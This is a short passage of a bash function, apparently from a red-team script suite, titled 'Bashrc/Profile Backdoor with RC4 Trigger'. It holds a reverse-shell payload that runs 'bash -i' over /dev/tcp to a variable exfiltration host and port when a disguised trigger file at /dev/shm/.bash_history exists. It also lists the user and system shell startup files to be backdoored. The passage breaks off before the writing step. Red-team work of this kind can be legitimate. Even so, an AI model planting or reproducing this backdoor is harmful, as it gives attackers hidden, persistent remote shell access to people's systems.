rt_704_bashrc_profile_backdoor() {
    rt_banner "RT-704" "Bashrc/Profile Backdoor with RC4 Trigger"
    local TRIGGER="/dev/shm/.bash_history"
    local PAYLOAD="if [[ -f $TRIGGER ]]; then bash -i >& /dev/tcp/$EXFIL_HOST/$EXFIL_PORT 0>&1 &>/dev/null & fi"
    local FILES=("$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.profile" "/etc/bash.bashrc" "/etc/profile")
